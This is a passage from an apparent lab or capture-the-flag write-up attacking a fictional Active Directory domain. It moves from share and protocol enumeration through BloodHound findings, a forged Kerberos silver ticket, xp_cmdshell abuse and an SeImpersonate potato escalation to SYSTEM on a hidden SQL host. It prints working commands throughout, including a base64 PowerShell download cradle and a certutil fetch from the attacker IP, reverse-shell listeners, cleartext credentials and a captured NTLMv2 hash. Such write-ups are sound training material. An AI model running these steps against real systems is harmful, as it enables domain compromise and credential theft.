# 7. Authenticated Enumeration — svc_mssql

## 7.1 Share Enumeration — FILES

With authenticated access comes proper share enumeration:

```bash
➜ nxc smb files.westbridge.hsm \
    -u svc_mssql -p 'sqls3rv3r' \
    --shares
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_mssql:sqls3rv3r
SMB         10.0.10.15      445    FILES            [*] Enumerated shares
SMB         10.0.10.15      445    FILES            Share           Permissions            Remark
SMB         10.0.10.15      445    FILES            -----           -----------            ------
SMB         10.0.10.15      445    FILES            ADMIN$                                 Remote Admin
SMB         10.0.10.15      445    FILES            C$                                     Default share
SMB         10.0.10.15      445    FILES            IPC$            READ                   Remote IPC
SMB         10.0.10.15      445    FILES            IT-Share                               IT Internal - Administrators Only
SMB         10.0.10.15      445    FILES            Scripts                                File Server Support members only
SMB         10.0.10.15      445    FILES            Students        READ                   Public student resources and academic documents
```

The `[+]` line confirms the credential is domain-wide, not DC-only — and **Students** is readable, with two juicy-looking restricted shares (`IT-Share`, `Scripts`) waiting for better privileges.

## 7.2 Protocol Matrix

With a valid domain credential, every protocol gets re-tested — not just the one that cracked (MSSQL is omitted here — port 1433 isn't open on the DC; SQL lives on a separate host and gets its own [Section 9](#9-pivot--the-hidden-sql-host) walk). First the DC:

```bash
➜ for proto in smb ldap winrm rdp; \
    do nxc $proto dc.westbridge.hsm -u 'svc_mssql' -p 'sqls3rv3r'; \
    echo '---';
done

SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
---
LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
---
WINRM       10.0.10.5       5985   DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm)
WINRM       10.0.10.5       5985   DC               [-] westbridge.hsm\svc_mssql:sqls3rv3r
---
RDP         10.0.10.5       3389   DC               [*] Windows 10 or Windows Server 2016 Build 26100 (name:DC) (domain:westbridge.hsm) (nla:True)
RDP         10.0.10.5       3389   DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
```

SMB and LDAP are in — but the standout is **RDP `[+]`**: NLA accepted the logon, meaning `svc_mssql` is allowed interactive RDP sessions to the DC. That's a potential GUI foothold (`xfreerdp` / dynamic desktop) if we need one.

FILES mirrors the pattern:

```bash
➜ nxc smb 10.0.10.15 \
    -u svc_mssql -p 'sqls3rv3r'
SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_mssql:sqls3rv3r

➜ nxc winrm 10.0.10.15 \
    -u svc_mssql -p 'sqls3rv3r'
WINRM       10.0.10.15      5985   FILES            [*] Windows 11 / Server 2025 Build 26100 (name:FILES) (domain:westbridge.hsm)
WINRM       10.0.10.15      5985   FILES            [-] westbridge.hsm\svc_mssql:sqls3rv3r
```

SMB in, WinRM out — the same shape as the DC, and the same reason: the account isn't in Remote Management Users.

## 7.3 BloodHound Collection

With `svc_mssql`:`sqls3rv3r` in cleartext, the clean path is simple bind:

```bash
➜ rusthound-ce \
    -d westbridge.hsm -f dc.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r' \
    --zip -c All
```

---

# 8. BloodHound Intel — The Bigger Picture

## 8.1 A Second Forest

```
WESTBRIDGE.HSM  <->  WESTBRIDGE-RESEARCH.HSM
```

Bidirectional **forest trust**, SID filtering enabled. There's an entire research forest on the other side of the DC — and suddenly the account named `researchoperator` in our web dump doesn't look random anymore. Cross-forest attack surface is now in scope.

![BloodHound — cross-forest trust to WESTBRIDGE-RESEARCH.HSM](/assets/images/westbridge-bh-cross-forest-trust.png)

## 8.2 Hosts That Never Appeared on the Wire

Our scans found three hosts. BloodHound shows **five computer objects**:

| Computer | Seen in scans? |
|---|---|
| `DC$` | yes |
| `FILES$` | yes |
| `WEB$` | yes |
| **`SQL$`** | **no** — matches `svc_mssql`'s SPN `MSSQLSvc/SQL.westbridge.hsm:1433` |
| **`HELPDESK-WS$`** | **no** — a workstation, hidden from our subnet |

`SQL` and `HELPDESK-WS` are live objects the network scan never surfaced. DNS enumeration against the DC should resolve them.

![BloodHound — svc_mssql and the hidden SQL host](/assets/images/westbridge-bh-svc-mssql.png)
![BloodHound — svc_mssql SPN pointing at SQL.westbridge.hsm](/assets/images/westbridge-bh-svc-mssql-spn.png)

The SPN in the LDAP dump (`MSSQLSvc/SQL.westbridge.hsm:1433`) already told us a machine named `sql` existed — DNS just confirmed its address. The same brute also popped a second hidden host we'd never have guessed:

```bash
➜ for h in sql db mssql helpdesk-ws helpdesk hr dev mail fs nas vpn; do
    ip=$(dig +short @10.0.10.5 $h.westbridge.hsm A); [ -n "$ip" ] && echo "$h -> $ip";
  done
sql -> 10.0.10.20
helpdesk-ws -> 10.0.10.25
```

Updating our hosts file so Kerberos/SMB tooling resolves both correctly later:

```bash
10.0.10.20    SQL.westbridge.hsm SQL
10.0.10.25    HELPDESK-WS.westbridge.hsm HELPDESK-WS   # parked for later — unscanned
```

## 8.3 Delegation

`svc_files` (SPN: `HOST/FILES.westbridge.hsm`) has **AllowedToDelegate ➜ `FILES$`** — constrained delegation to the file server itself. Once we own `svc_files`, that's an S4U path to act as *any* user against the FILES service.

![BloodHound — svc_files AllowedToDelegate to FILES / FILES.WESTBRIDGE.HSM](/assets/images/westbridge-bh-svcfiles-delegate.png)

## 8.4 Non-Default ACL Edges

Filtering out the default domain noise, four edges look *placed*:

| Principal | Edge | Target |
|---|---|---|
| **`svc_webmonitor`** | **AddKeyCredentialLink** | **`svc_files`** |
| `m.thompson` | GenericAll | `STUDENTS` OU (inherits down to the dozen student accounts inside) |
| `svc_krb_t2` | GenericAll | `IT TIER2` OU |
| unknown RID `9510` | GenericAll | `IT TIER3` OU |

![BloodHound — svc_webmonitor outbound: AddKeyCredentialLink on svc_files](/assets/images/westbridge-bh-svcwebmonitor-addkeycred.png)

![BloodHound — m.thompson GenericAll over the STUDENTS OU](/assets/images/westbridge-bh-mthompson-genericall-students.png)

![BloodHound — svc_krb_t2 GenericAll over IT TIER2](/assets/images/westbridge-bh-svckrbt2-genericall-tier2.png)

![BloodHound — RID 9510 GenericAll over IT TIER3 (anomaly — unnamed at this point)](/assets/images/westbridge-bh-9510-genericall-it-tier3.png)

The first one is the headline: **`svc_webmonitor` can drop a Shadow Credential on `svc_files`** — a key-trust attack (`pywhisker`) that yields `svc_files`'s identity without ever touching its password. And remember: `svc_files` has constrained delegation to `FILES$`. That's a two-hop chain: *own svc_webmonitor ➜ shadow-cred svc_files ➜ S4U to FILES$*.

Also interesting: RID 9510 holds GenericAll over IT TIER3 but never appeared in our 38-user web dump. An account the directory app doesn't show — worth an LDAP lookup now that we have authenticated access. At this point it's just an anomaly: a hidden account with total control over the privileged tier. Spoiler-free: it gets named in [Section 11.1.3](#1113-it-tier3--the-admins) (Tombstone) and the full chain in [Section 16.4](#164-jdillon-it-tier3-aowen).

## 8.5 Group Map

The web dump labelled `m.thompson`, `c.wilson`, `s.adams` as "Member of Administrators" — but that's the People Directory's *own* app-level role, not AD. Cross-referencing BloodHound, none of them sit in `Domain Admins`; their real group memberships are below. (m.thompson's actual standing — IT Tier1 + MSSQL Maintenance + Student Account Administrators — is what drives the OU abuse in [Section 11.1](#111-the-mthompson-picture).)

| Account | AD Groups (from BloodHound) |
|---|---|
| `m.thompson` | IT Tier1 Support · MSSQL Maintenance · Student Account Administrators |
| `s.adams`, `c.wilson` | Account Policy Administrators |
| `j.walsh` | MSSQL Maintenance (co-sysadmin on SQL, see [Section 9.4](#94-the-prize--westbridgemssql-maintenance) |
| `svc_webmonitor` | **File Server Administration** 🡐 owns the shadow-cred edge |
| `svc_web` | Web Backup Maintainers |
| `svc_files` | File Server Service Accounts |
| `svc_krb_t2` | Tier 2 Provisioning Services |
| `researchoperator` | standalone — likely cross-forest |

---

# 9. Pivot — The Hidden SQL Host

> Why brute-force the front door when you can just forge the VIP pass? Welcome to Silver Tickets; for when you want to skip the humans entirely.

## 9.1 Discovery & First Contact

The SPN on `svc_mssql` (`MSSQLSvc/SQL.westbridge.hsm:1433`) named a machine our port scans never saw. The DC's DNS confirmed it:

```bash
➜ dig +short @10.0.10.5 sql.westbridge.hsm A
10.0.10.20
```

```bash
PORT     STATE SERVICE       REASON  VERSION
1433/tcp open  ms-sql-s      syn-ack Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info:
|   10.0.10.20:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
...
| ms-sql-ntlm-info:
|   10.0.10.20:1433:
|     Target_Name: WESTBRIDGE
|     NetBIOS_Domain_Name: WESTBRIDGE
|     NetBIOS_Computer_Name: SQL
|     DNS_Domain_Name: westbridge.hsm
|     DNS_Computer_Name: SQL.westbridge.hsm
|     DNS_Tree_Name: westbridge.hsm
|_    Product_Version: 10.0.26100
3389/tcp open  ms-wbt-server syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=SQL.westbridge.hsm
| Issuer: commonName=SQL.westbridge.hsm
...
```

Quick probe: ICMP drops, but **1433 (MSSQL)** and **3389 (RDP)** answer:

```bash
➜ nxc mssql sql.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r'
MSSQL       10.0.10.20      1433   SQL              [*] Windows 11 / Server 2025 Build 26100 (2019 RTM 15.0.2000) (name:SQL) (domain:westbridge.hsm) (EncryptionReq:False)
MSSQL       10.0.10.20      1433   SQL              [+] westbridge.hsm\svc_mssql:sqls3rv3r
```

Same cracked credential, brand-new hidden host.

## 9.2 Mapping the Instance

With the cracked `svc_mssql:sqls3rv3r` credential, connect to the instance over Windows auth (the SQL box is domain-joined, so the domain account logs in directly):

```bash
➜ mssqlclient.py \
    westbridge.hsm/svc_mssql:'sqls3rv3r'@10.0.10.20 \
    -windows-auth

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (WESTBRIDGE\svc_mssql  guest@master)>
```

> **Reading the mssqlclient prompt.** Format: `SQL (DOMAIN\user role@db)>`. The middle column is the **effective server role** for the connection, not the Windows identity — SQL Server reads it from the PAC the KDC minted. `guest` (default) means "no sysadmin, routed through the guest principal". After the silver ticket later ([Section 9.5](#95-silver-ticket--skipping-the-humans-entirely), our connection becomes `dbo@master>` because the forged PAC's group RID 9497 grants sysadmin. The login name in the left column never changes; only what the server thinks it's allowed to do.

Before touching anything, baseline what this login *is* and *isn't* — query by query.

First, what version and OS are we on?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT @@VERSION;
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
        Sep 24 2019 13:48:23
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2025 Datacenter 10.0 <X64> (Build 26100: ) (Hypervisor)
```

SQL Server 2019 **Express** on Windows Server 2025. Express is the limited/free edition, but it still runs as a Windows **service account** — and that's the part we care about: whatever we coerce later executes as `svc_mssql`, not SYSTEM. The OS line is just context.

Next, who are we, and do we hold the `sysadmin` fixed-server role?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

-   -
0   0
```

`SYSTEM_USER` is `WESTBRIDGE\svc_mssql` (our login); `IS_SRVROLEMEMBER('sysadmin')` returns `0` — **we are not a SQL sysadmin**. That single fact is the entire reason [Section 9.5](#953-forge-the-ticket) exists: with no sysadmin role we can't `xp_cmdshell` onto the box, so we forge a silver ticket that *claims* the sysadmin group instead. (It also means the `MSSQL Maintenance` membership we find in [Section 9.4](#94-the-prize--westbridgemssql-maintenance) is the only path to sysadmin — and it lives in the directory, not in this SQL login.)

What databases are visible?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT name FROM sys.databases;
name
----------
master
tempdb
model
msdb
Westbridge
```

The usual system DBs plus a custom **`Westbridge`** database — the app's data store and the obvious loot. We can *see* it listed but can't open it yet.

And what can this login actually do at the server level?

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT * FROM fn_my_permissions(NULL,'SERVER');
entity_name   subentity_name   permission_name
-----------   --------------   -------------------
server                         CONNECT SQL
server                         VIEW ANY DATABASE
server                         VIEW ANY DEFINITION
```

The honest ceiling: only `CONNECT SQL`, `VIEW ANY DATABASE`, and `VIEW ANY DEFINITION`. Read-only enumeration rights — no `IMPERSONATE ANY LOGIN`, no `ALTER ANY LOGIN`, no `CONTROL SERVER`. That rules out the easy SQL privesc routes (IMPERSONATE a sysadmin login, or self-grant the role), which is why the restore-and-read path in [Section 9.7](#97-the-backup--westbridgebak) is the play, not an in-SQL escalation.

That's the ceiling for this login: **not** a SQL sysadmin, the `Westbridge` DB is visible in the catalog but locked to `svc_mssql`, and the server-level rights are read-only (`CONNECT SQL` / `VIEW ANY DATABASE` / `VIEW ANY DEFINITION` only). The next questions are whether the *service* account fares any better, and who in AD actually holds `sysadmin` — which is exactly what [Section 9.3](#93-coercion-check--who-does-the-service-run-as) and [Section 9.4](#94-the-prize--westbridgemssql-maintenance) check.

## 9.3 Coercion Check — Who Does the Service Run As?

Even without sysadmin, the classic `xp_dirtree` UNC trick tests what the MSSQL *service* authenticates as. Firing it at our Responder:

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> EXEC master.sys.xp_dirtree '\\192.168.211.2\capture',1,1
```

The query hangs — `xp_dirtree` makes the *service* (not our login) reach out over SMB to the UNC path, so it blocks waiting on a callback. Responder caught it:

```bash
[SMB] NTLMv2-SSP Client   : 10.0.10.20
[SMB] NTLMv2-SSP Username : WESTBRIDGE\svc_mssql
[SMB] NTLMv2-SSP Hash     : svc_mssql::WESTBRIDGE:7bca4a5d8e4250f5:860C49449E87209D4C4690AB84E922A7:01010000000000008000D4423437DD015E326CA9C877E7E60000000002000800420059003500310001001E00570049004E002D005000590037004A00310048004B00310046005A00510004003400570049004E002D005000590037004A00310048004B00310046005A0051002E0042005900350031002E004C004F00430041004C000300140042005900350031002E004C004F00430041004C000500140042005900350031002E004C004F00430041004C00070008008000D4423437DD010600040002000000080050005000000000000000000000000030000029F49D9768AEA3C9EA4F84C3864A2E69B899284AA2040A0C2D64CCECBDA1508A5EF7596AADF850CBC5C5FB8A046D73F9ADD6FB436459C6C3170D8AD43C843E130A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003200310031002E0032000000000000000000
```

**The service runs as the domain account we already own** — `WESTBRIDGE\svc_mssql`, no new hash to crack. But two facts got locked in: the coercion primitive works, and any future code execution on this box runs as `svc_mssql`. Relay check came back negative (DC/FILES enforce signing, SQL has no 445 reachable) — so this is parked until a signing-exempt target appears.

## 9.4 The Prize — WESTBRIDGE\MSSQL Maintenance

Who actually *is* sysadmin here? Enumerate the `sysadmin` **fixed-server role** by joining the role principals to their members (`sys.server_role_members`):

```sql
SQL (WESTBRIDGE\svc_mssql  guest@master)> SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
role       member
--------   ----------------------------
sysadmin   sa
sysadmin   NT SERVICE\SQLWriter
sysadmin   NT SERVICE\Winmgmt
sysadmin   NT Service\MSSQLSERVER
sysadmin   WESTBRIDGE\MSSQL Maintenance
```

Four of the five rows are *built-in* sysadmins — `sa` (the SQL superuser), and the three `NT SERVICE*` engine SIDs (SQL Writer, WMI, and the SQL Server service itself). They're noise for us: `sa` is locked down and the service SIDs aren't credentially reachable.

The fifth row is the one that matters, and the reason this block is headed "The Prize":

```sql
sysadmin   WESTBRIDGE\MSSQL Maintenance
```

`WESTBRIDGE\MSSQL Maintenance` is a **domain group**, not a local SQL principal. SQL Server's highest privilege is held by a directory object we can touch from outside the instance.

That's the whole shift: in [Section 9.2](#92-mapping-the-instance) we established our own login (`svc_mssql`) is *not* sysadmin and can't grant itself the role. But here we learn sysadmin is conferred through group membership — and group membership is decided in AD, not inside SQL. So there are now two ways to become sysadmin: **own a member of `WESTBRIDGE\MSSQL Maintenance`** (a human password), **or forge a token that already claims the group** (the silver ticket in [Section 9.5](#953-forge-the-ticket) — which is exactly why `-groups 9497` there targets this group's RID). The humans are the *obvious* path; the forged-group path is the *shortcut* that skips them.

Cross-referencing BloodHound:

| Member | Elsewhere |
|---|---|
| **m.thompson** | flagged "Administrator" by the People Directory (app-role, **not** AD Domain Admins), IT Tier1 Support |
| **j.walsh** | plain user |

Own either identity ➜ sysadmin ➜ `enable xp_cmdshell` ➜ code execution on SQL as `svc_mssql`. The impersonation shortcuts are all closed (no IMPERSONATE grants, no ALTER ANY LOGIN for us), so the path runs through one of those two humans.

**Leads toward them:** RDP is open on SQL (NLA accepts svc_mssql) — a maintenance group implies maintenance logons worth waiting for on an interactive session; the Flask app's DB connection string lives somewhere on WEB; and `HELPDESK-WS` (10.0.10.25) is now resolvable.

One more graph detail worth flagging from this collection: BloodHound's `SQLAdmin` edge runs from the **`WESTBRIDGE\MSSQL Maintenance`** group (m.thompson, j.walsh) toward `SQL.WESTBRIDGE.HSM` — its way of recording that those identities hold the SQL instance's `sysadmin` fixed-server role, i.e. "these accounts can administer the SQL box." That's the same fact the `sys.server_role_members` query surfaced above, now visualized: it's *why* owning either human meant owning the box, and it's what put the hidden SQL host on our map as a target worth pivoting to.

![BloodHound — MSSQL Maintenance SQLAdmin edge to the hidden SQL host](/assets/images/westbridge-bh-svcmssql-sqladmin.png)

## 9.5 Silver Ticket — Skipping the Humans Entirely

Why chase `j.walsh`'s password when we already own the service account whose secret encrypts every TGS for `MSSQLSvc/SQL.westbridge.hsm:1433`? The silver ticket needs no KDC contact, no IMPERSONATE grants, nothing — just three core ingredients (the domain SID, the service-account RC4 key, and the SPN) that become five `ticketer` flags once you add the injected `MSSQL Maintenance` group RID and a cosmetic user RID.

### 9.5.1 Domain SID

The domain SID is the authority the forged ticket carries into the environment; without it the ticket is just an SPN-bound blob with no place to land.

```bash
➜ nxc ldap dc.westbridge.hsm \
    -u 'svc_mssql' -p 'sqls3rv3r' \
    --get-sid

LDAP        10.0.10.5       389    DC               [*] Windows 11 / Server 2025 Build 26100 (name:DC) (domain:westbridge.hsm) (signing:None) (channel binding:When Supported)
LDAP        10.0.10.5       389    DC               [+] westbridge.hsm\svc_mssql:sqls3rv3r
LDAP        10.0.10.5       389    DC               Domain SID S-1-5-21-1978613116-3728955385-531918137
```

### 9.5.2 Plaintext to NT hash

We cracked `svc_mssql`'s password (`sqls3rv3r`) earlier, so we already hold its plaintext — convert it to the RC4 NT key that actually signs the ticket.

```bash
➜ pypykatz crypto nt 'sqls3rv3r'
025d7fd412286bef880ba432685d6d8f
```

### 9.5.3 Forge the ticket

Now build the silver ticket: sign it with the service-account RC4 key, bind it to the SQL SPN (`MSSQLSvc/SQL.westbridge.hsm:1433`, the one BloodHound records on `svc_mssql`), and stamp the PAC with the domain SID, the MSSQL Maintenance group RID, and our user RID so SQL Server reads a sysadmin token on connect.

The five `ticketer` flags each carry one piece of the forgery:

* **`-nthash`** — `svc_mssql`'s RC4 key, used to sign the ticket.
* **`-domain-sid`** — the domain the forged ticket claims membership in.
* **`-spn`** — `MSSQLSvc/SQL.westbridge.hsm:1433`, the service the ticket unlocks (and what makes it a *silver* ticket rather than a TGT).
* **`-groups 9497`** — the `MSSQL Maintenance` group RID, the actual payload: SQL Server reads this from the PAC and grants `sysadmin` on connect.
* **`-user-id 9459`** — cosmetic; just a unique RID for the forged user. The power lives in `-groups`.

```bash
➜ ticketer.py -nthash 025D7FD412286BEF880BA432685D6D8F \
    -domain-sid S-1-5-21-1978613116-3728955385-531918137 \
    -domain westbridge.hsm \
    -spn MSSQLSvc/SQL.westbridge.hsm:1433 \
    -groups 9497 \
    -user-id 9459 \
    svc_mssql

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for westbridge.hsm/svc_mssql
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving/Updating ticket in svc_mssql.ccache
```

(`svc_mssql` accepted the RC4-signed forgery — consistent with an RC4-only `msDS-SupportedEncryptionTypes`, since the silver ticket is sealed with its NT hash.)

![BloodHound — svc_mssql's registered SPN: MSSQLSvc/SQL.westbridge.hsm:1433](/assets/images/westbridge-bh-svc-mssql-spn.png)

> **Cross-check — which SPN string lands in the ccache?** The SPN we passed to `ticketer.py -spn` was `MSSQLSvc/SQL.westbridge.hsm:1433`; the silver ticket stores it in the ccache's `server` field as `MSSQLSvc/SQL.westbridge.hsm:1433@WESTBRIDGE.HSM`. The `sql_mssql/SQL.westbridge.hsm@WESTBRIDGE.HSM` you'd see on `klist` came from a different ccache — the TGT-based ticket `mssqlclient.py -k` was actually using (env var `KRB5CCNAME` was still pointing at an earlier step's ccache, not `svc_mssql.ccache`). None of it changes the lesson: the receiving service authenticates the *account*, not the SPN string — the SPN is the routing label, the proof of identity is the encryption. That's also why silver tickets are KDC-invisible: no 4769 event exists for the ticket itself, since no KDC was ever asked to mint it.

```bash
➜ klist svc_mssql.ccache
Ticket cache: FILE:svc_mssql.ccache
Default principal: svc_mssql@WESTBRIDGE.HSM

Valid starting       Expires              Service principal
08/23/2026 02:15:47  08/20/2036 02:15:47  sql_mssql/SQL.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/20/2036 02:15:47
```

Connect and prove the group injection landed:

```bash
➜ nxc smb dc.westbridge.hsm --generate-krb5-file /tmp/krb5.conf
➜ sudo cp /tmp/krb5.conf /etc/krb5.conf

➜ env KRB5CCNAME=svc_mssql.ccache \
mssqlclient.py \
    'westbridge.hsm/svc_mssql@sql.westbridge.hsm' -k -no-pass

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2019 RTM (15.0.2000)
[!] Press help for extra shell commands
SQL (WESTBRIDGE\svc_mssql  dbo@master)>
```

## 9.6 SYSTEM on SQL

We hold a `sysadmin` token purely because of the group RID we forged into the PAC in [Section 9.5](#953-forge-the-ticket) — but `xp_cmdshell` is *disabled by default*, so the first move is to switch it on. That `enable_xp_cmdshell` call is itself the proof the forgery landed: flipping `show advanced options` / `xp_cmdshell` to `1` requires the `sysadmin` fixed-server role, which is exactly the right the silver ticket's injected `WESTBRIDGE\MSSQL Maintenance` membership grants.

First, start the listener that the shell will call back to:

```bash
➜ rlwrap -cAr ncat -lnvp 9294
```

With the forged sysadmin token, walk the `xp_cmdshell` enablement step by step. First, confirm the injected role actually took — `IS_SRVROLEMEMBER('sysadmin')` should now return `1`:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');

-
1
```

`1` — the silver ticket's injected `WESTBRIDGE\MSSQL Maintenance` membership is being read as `sysadmin`. The forgery landed.

Now turn the advanced-options switch on. `sp_configure 'show advanced options', 1` stages the change; `RECONFIGURE` applies it:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(SQL): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (WESTBRIDGE\svc_mssql  dbo@master)> RECONFIGURE;
```

Then enable `xp_cmdshell` itself, same two-step pattern:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(SQL): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (WESTBRIDGE\svc_mssql  dbo@master)> RECONFIGURE;
```

Verify it's live by reading the in-use value straight from `sys.configurations`:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell';
value_in_use
------------
           1
```

`1` confirms `xp_cmdshell` is enabled. Run it — `whoami` tells us *which Windows identity* the shell will execute as:

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC xp_cmdshell 'whoami';
output
--------------------
westbridge\svc_mssql
NULL

SQL (WESTBRIDGE\svc_mssql  dbo@master)> EXEC xp_cmdshell 'hostname';
output
------
SQL
NULL
```

`xp_cmdshell` executes under the **SQL Server service account**, so the reverse shell comes back as `westbridge\svc_mssql` — *not* the `m.thompson`/`j.walsh` logins we never had. The silver ticket bought us the SQL `sysadmin` right; it did nothing for Windows logon, so we're still the service identity until we escalate.

Start the listener:

```bash
➜ rlwrap -cAr ncat -lnvp 9294
```

Fire the download-cradle — the base64 is a PowerShell one-liner pulling `shell.ps1` from the attacker box (same pattern used throughout):

```sql
SQL (WESTBRIDGE\svc_mssql  dbo@master)> xp_cmdshell "powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA
```

And escalate we can, because service-account contexts carry the eternal gift: **SeImpersonatePrivilege**.

```bash
PS > whoami; hostname
westbridge\svc_mssql
SQL

PS > whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

`SeImpersonatePrivilege` (Enabled) is the classic Windows-service escalation primitive. Any process running as a service that can impersonate clients can be tricked into impersonating a privileged one — that's the entire "Potato" family (`Rotten`, `Juicy`, `God`..), all of which abuse it via a named-pipe / DCOM / Print-Spooler coercion. **CrystalPotato** is the flavour we drop here: it coerces an authenticated connection from the SYSTEM security context and catches it with the impersonation privilege, netting us a second shell as `NT AUTHORITY\SYSTEM`. The full primitive explanation, the tool's mechanism, and both lab runs (SQL with no AV, research web with Defender) live in [Appendix A](#appendix-a-the-seimpersonate-potato--crystalpotato).

We pull it down over the existing `svc_mssql` shell. Start the *second* listener on `9295` first — this callback is the SYSTEM one, distinct from the `9294` shell:

```bash
➜ rlwrap -cAr ncat -lnvp 9295
```

Upload the potato with a `certutil` download-cradle from the attacker box:

```bash
PS > cd /programdata
PS > certutil -urlcache -f -split http://192.168.211.2/CrystalPotato.exe potato.exe
```

Test it before betting the shell on it — `-c whoami` runs a single command through the impersonated token:

```bash
PS > .\potato.exe -c whoami
nt authority\system
```

`nt authority\system` — the SeImpersonate coercion landed. Now run the same PowerShell cradle as before through it; the callback arrives on `9295` as SYSTEM:

```bash
PS > .\potato.exe -c 'powershell.exe -ep bypass -nop -w hidden -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADEAMQAuADIALwBzAGgAZQBsAGwALgBwAHMAMQAiACkA'
```

Second shell comes in — this one is SYSTEM:

```bash
Ncat: Connection from 10.0.10.20:50050.

PS > whoami; hostname
nt authority\system
SQL
```

### 9.6.1 Captured Flag #1

SYSTEM on SQL. Read the flag:

```bash
PS > type C:\Users\Administrator\Desktop\flag.txt
Flag01{SILVER_XXXXXXX_XXXXXXXX_XXXXX_BACKUPS}
```

**Full compromise of the hidden SQL host** — no credentials for `m.thompson` or `j.walsh` required. The sysadmin group membership we couldn't log in with, we simply *wrote into* a ticket signed by a key the domain already let us have.

## 9.7 The Backup — Westbridge.bak

The flag text itself points at the next step (`...MSSQL_BACKUPS`), and there it is:

```powershell
PS > dir C:\backup

    Directory: C:\backup

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----   7/3/2026   6:16 PM   3067904   Westbridge.bak
```

The custom `Westbridge` database — the one every login was locked out of back in [Section 9.2](#92-mapping-the-instance) — sitting as a raw `.bak`.

